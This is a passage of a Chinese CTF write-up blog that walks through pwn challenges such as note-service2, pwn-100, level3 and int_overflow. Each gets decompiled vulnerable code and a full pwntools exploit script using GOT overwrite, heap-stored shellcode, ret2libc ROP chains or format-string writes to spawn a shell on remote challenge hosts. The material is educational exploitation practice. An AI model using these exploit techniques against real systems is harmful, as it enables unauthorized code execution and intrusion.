segments</span><br></pre></td></tr></table></figure><p>漏洞函数：存放堆指针的数组可越界存放。也就是堆指针可放置到任意地方。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myadd</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> chunk_size; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = dword_20209C;</span><br><span class="line">  <span class="keyword">if</span> ( dword_20209C &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = dword_20209C;</span><br><span class="line">    <span class="keyword">if</span> ( dword_20209C &lt;= <span class="number">11</span> )<span class="comment">//chunk上限11个</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">      v1 = getinput();</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;size:&quot;</span>);</span><br><span class="line">      result = getinput();</span><br><span class="line">      chunk_size = result;</span><br><span class="line">      <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        qword_2020A0[v1] = <span class="built_in">malloc</span>(result);<span class="comment">//堆指针存放可越界</span></span><br><span class="line">        <span class="keyword">if</span> ( !qword_2020A0[v1] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;malloc error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">        myread(qword_2020A0[v1], chunk_size);</span><br><span class="line">        result = dword_20209C++ + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序没有 NX 保护，可以将 shellcode 存放在堆上，然后通过数组越界覆盖 got 表调用 shellcode 。</p><p>程序限制堆大小不超过 8 ，且读入数据函数会占用最后一个字节写入 <code>\x00</code> 。可写入空间仅有 7 ，所以需要用汇编的跳转指令 <code>jnz short xxx</code> ，对应的十六进制为：<code>EB xx</code>，其中 <code>xx</code> 为偏移量。偏移量计算公式为：<code>xx = 目标地址 - 当前地址 -2</code></p><p>程序申请一个 size 为 8 的堆结构如下：<a href="https://blog.csdn.net/seaaseesa/article/details/103003167">图源</a></p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-04-28-L34hKzcbF5t0n8G3.png"></p><p>从 chunk 0 jmp 头开始计算：<code>xx</code>  = 2+1+8+8+8-2=0x19</p><p>构造一个调用 system 函数的shellcode ，然后数组越界覆盖一个可被控制输入参数的函数，例如 atoi ，传入参数 <code>/bin/sh\x00</code> 。这种构造方法要最后才修改 got 表，避免修改导致程序输入函数失效。</p><p>也可以到 shell-storm 找一个直接调用 <code>system(&#39;/bin/sh&#39;)</code> 的shellcode 一把梭哈。</p><p><strong>完整 exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encodeing:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)  </span><br><span class="line">p = remote(<span class="string">&quot;124.126.19.106&quot;</span>,<span class="number">41618</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./note-service2&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your choice&gt;&gt; &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your choice&gt;&gt; &quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#call system</span></span><br><span class="line">code0 = (asm(<span class="string">&#x27;xor rax,rax&#x27;</span>) + <span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>) </span><br><span class="line">code1= (asm(<span class="string">&#x27;mov eax,0x3B&#x27;</span>) + <span class="string">&#x27;\xeb\x19&#x27;</span>)  </span><br><span class="line">code2 = (asm(<span class="string">&#x27;xor rsi,rsi&#x27;</span>) + <span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)  </span><br><span class="line">code3 = (asm(<span class="string">&#x27;xor rdx,rdx&#x27;</span>) + <span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>) </span><br><span class="line">code4 = (asm(<span class="string">&#x27;syscall&#x27;</span>).ljust(<span class="number">7</span>,<span class="string">&#x27;\x90&#x27;</span>))  </span><br><span class="line"></span><br><span class="line"><span class="comment">#system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">shellcode0 = <span class="string">&quot;\x01\x30\x8f\xe2&quot;</span> + <span class="string">&#x27;\x90\xeb\x19&#x27;</span></span><br><span class="line">shellcode1 = <span class="string">&quot;\x13\xff\x2f\xe1&quot;</span> + <span class="string">&#x27;\x90\xeb\x19&#x27;</span></span><br><span class="line">shellcode2 = <span class="string">&quot;\x78\x46\x0e\x30&quot;</span> + <span class="string">&#x27;\x90\xeb\x19&#x27;</span></span><br><span class="line">shellcode3 = <span class="string">&quot;\x01\x90\x49\x1a&quot;</span> + <span class="string">&#x27;\x90\xeb\x19&#x27;</span></span><br><span class="line">shellcode4 = <span class="string">&quot;\x92\x1a\x08\x27&quot;</span> + <span class="string">&#x27;\x90\xeb\x19&#x27;</span></span><br><span class="line">shellcode5 = <span class="string">&quot;\xc2\x51\x03\x37&quot;</span> + <span class="string">&#x27;\x90\xeb\x19&#x27;</span></span><br><span class="line">shellcode6 = <span class="string">&quot;\x01\xdf\x2f\x62&quot;</span> + <span class="string">&#x27;\x90\xeb\x19&#x27;</span></span><br><span class="line">shellcode7 = <span class="string">&quot;\x69\x6e\x2f\x2f&quot;</span> + <span class="string">&#x27;\x90\xeb\x19&#x27;</span></span><br><span class="line">shellcode8 = <span class="string">&quot;\x73\x68&quot;</span> + <span class="string">&#x27;\x90\x90\x90\x90\x90&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#write shellcode </span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">8</span>,code1)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">8</span>,code2)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">8</span>,code3)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">8</span>,code4)</span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite atoi@got.plt</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(-<span class="number">8</span>,<span class="number">8</span>,code0)</span><br><span class="line"></span><br><span class="line"><span class="comment">#send /bin/sh</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;your choice&gt;&gt; &quot;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>[/collapse]</p><h3 id="pwn-100"><a href="#pwn-100" class="headerlink" title="pwn-100"></a>pwn-100</h3><p>[collapse title=”展开查看详情” status=”false”]<br><strong>考点：栈溢出、ROP</strong></p><p>这个栈溢出每次固定要求输入 200 个字符，也没有别的了。</p><p>ROP 操作也不需要往 bss 写入 /bin/sh ，直接在 libc 找一个就好了。（看到网上有这样的操作orz）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;124.126.19.106&#x27;</span>,<span class="number">35604</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn-100&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn-100&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400763</span></span><br><span class="line">start_addr = <span class="number">0x400550</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(start_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak puts@got.plt</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;bye~\n&quot;</span>)</span><br><span class="line">puts_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;puts_leak:&quot;</span>+<span class="built_in">hex</span>(puts_leak))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">libc_base = puts_leak - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;system_addr:&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">log.success(<span class="string">&quot;binsh_addr:&quot;</span>+<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#call system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>[/collapse]</p><h3 id="pwn-200"><a href="#pwn-200" class="headerlink" title="pwn-200"></a>pwn-200</h3><p>[collapse title=”展开查看详情” status=”false”]<strong>考点：栈溢出、泄露地址</strong></p><p>漏洞函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sub_8048484</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+1Ch] [ebp-6Ch]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);<span class="comment">//溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可操作空间空间很长就不需要什么骚操作了。就是没给 libc 文件，需要去<a href="https://libc.blukat.me/">libc database</a> 查一下而已。查到的话是这个：libc6-i386_2.23-0ubuntu11_amd64.so</p><p>完整 exp ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;159.138.137.79&quot;</span>,<span class="number">55989</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc6-i386_2.23-0ubuntu11_amd64.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x080483D0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(write_plt) + p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;!\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_leak = u32(p.recvuntil(<span class="string">&quot;Welcome&quot;</span>,drop=<span class="number">1</span>))</span><br><span class="line">log.success(<span class="string">&quot;write_leak:&quot;</span>+<span class="built_in">hex</span>(write_leak))</span><br><span class="line">libc_base = write_leak - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;system:&quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">log.success(<span class="string">&quot;binsh:&quot;</span>+<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(system) + p32(main_addr) + p32(binsh)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>[/collapse]</p><h3 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p>考点：写入小数字格式化字符串</p><p>完整 exp ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;;debug&#x27;</span>;</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;111.198.29.45&quot;</span>,<span class="number">59528</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./CGfsb&quot;)</span></span><br><span class="line"></span><br><span class="line">pwnme = <span class="number">0x0804A068</span></span><br><span class="line">payload = <span class="string">&quot;%8c%12$n&quot;</span> + p32(pwnme)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;;a&#x27;</span>;*<span class="number">0x8</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;please&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>[/collapse]</p><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p>考点：栈溢出、ROP（ret2libc）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;amp;buf, <span class="number">0x100</span>u);<span class="comment">//溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打开了 NX 保护栈数据不可执行，程序没有预留后门。解决办法就是 ret2libc ，这种方法在《蒸米一步一步学ROP》中有详细讲解。<br>第一次执行是用于泄露 libc 地址；第二次调用 system 完成 ret2libc。</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcSearch <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;;debug&#x27;</span>;</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;111.198.29.45&quot;</span>,<span class="number">43333</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./level3&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./level3&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;;write&#x27;</span>;]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;;write&#x27;</span>;]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;;main&#x27;</span>;]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;;a&#x27;</span>;*<span class="number">0x88</span>+<span class="string">&#x27;;a&#x27;</span>;*<span class="number">0x4</span></span><br><span class="line">payload += p32(write_plt)+p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input:\n&quot;</span>,payload)</span><br><span class="line">write_leak = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line">log.success(<span class="string">&quot;write_leak:&quot;</span>+<span class="built_in">hex</span>(write_leak))</span><br><span class="line">libc_base = write_leak - libc.symbols[<span class="string">&#x27;;write&#x27;</span>;]</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;;system&#x27;</span>;]</span><br><span class="line">log.success(<span class="string">&quot;system_addr:&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">binsh_addr = libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>() + libc_base</span><br><span class="line">log.success(<span class="string">&quot;binsh_addr:&quot;</span>+<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;;a&#x27;</span>;*<span class="number">0x88</span>+<span class="string">&#x27;;a&#x27;</span>;*<span class="number">0x4</span></span><br><span class="line">payload += p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>[/collapse]</p><h3 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p>栈溢出。位置在 check_passwd strcpy ，s 最大长度为 0x199 。不能直接进行溢出，有检查 s 长度的函数，设想是限定在 4~8 。重点在于 s 的长度存储变量使用的是 unsigned int 类型，也就是最大长度为 255 （2的8次方-1）。</p><p>要绕过这个限制才能溢出控制 eip 。绕过方法很简单，这个变量存储单元是 8 位，如果长度为 256 的话，程序就认为长度为 0 。因为 256 的二进制是 0b100000000 ，低八位为 0b00000000 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">check_passwd</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v3; <span class="comment">// [esp+Fh] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &amp;lt;= <span class="number">3u</span> || v3 &amp;gt; <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid Password&quot;</span>);</span><br><span class="line">    result = (<span class="keyword">char</span> *)fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    result = <span class="built_in">strcpy</span>(&amp;amp;dest, s);<span class="comment">//溢出</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;;debug&#x27;</span>;</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;;111.198.29.45&#x27;</span>;,<span class="number">30389</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./int&quot;)</span></span><br><span class="line">what_is_this = <span class="number">0x0804868B</span></span><br><span class="line"></span><br><span class="line">payload = <span 